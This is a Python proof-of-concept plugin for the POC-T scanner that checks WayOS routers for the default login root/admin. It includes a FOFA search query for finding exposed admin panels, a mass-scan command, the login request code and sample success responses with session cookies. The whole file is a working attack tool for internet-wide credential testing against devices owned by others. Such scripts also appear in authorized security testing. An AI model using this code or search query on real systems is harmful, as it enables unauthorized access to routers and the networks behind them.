#-*- coding: UTF-8 -*- 
import requests

'''wayos_weakpass.py
This is the Proof of Concept( POC ) script of to verify the vuln of WAYOS-Router,
 the default account and passsword "root-admin".
\
	fofa: title==\"维盟（WayOS）智能路由管理系统  www.wayos.cn\"
	Usage: 
		python2 POC-T.py -s wayos_weakpass -aF   "title==\"维盟（WayOS）智能路由管理系统  www.wayos.cn\""

	Fail
	HTTP/1.1 200 OK
	Server: HTTPD  1.0
	Content-Length: 155
	Connection: close
	Pragma: no-cache
	Cache-Control: no-cache
	Content-Type: text/html;charset=gb2312

	<html><head><script type='text/javascript'>function init(){window.open('/login.html?flag=0','_self');}</script></head><body onLoad='init();'></body></html>
	---------------------------------
	Success
	HTTP/1.1 200 OK
	Server: HTTPD  1.0
	Content-Length: 158
	Connection: close
	Set-Cookie: wys_userid=root,wys_passwd=2A676BC1A13F88BC4E3B598ADEA331D0; path=/
	Pragma: no-cache
	Cache-Control: no-cache
	Content-Type: text/html;charset=gb2312

	<html><head><script type='text/javascript'>function init(){window.open('index.htm?_1584538795','_self');}</script></head><body onLoad='init();'></body></html>

'''

def poc(url):
	TIMEOUT = 5
	next_url = url if "http" in url else "http://" + url
	burp0_url = "%s/login.cgi" % next_url
	burp0_headers = {"User-Agent": "Mozilla/5.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "", "Content-Type": "application/x-www-form-urlencoded", "DNT": "1", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
	burp0_data = {"user": "root", "password": "admin", "Submit": "\xe7\x99\xbb \xe5\xbd\x95"}
	try:
		res_log = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, verify=False, timeout=TIMEOUT)

	#print(res_log.headers)
		if  "wys_userid=root"  in  res_log.headers["Set-Cookie"]:
			return url
		else:
			return False
	except:
		return False
	




	
	
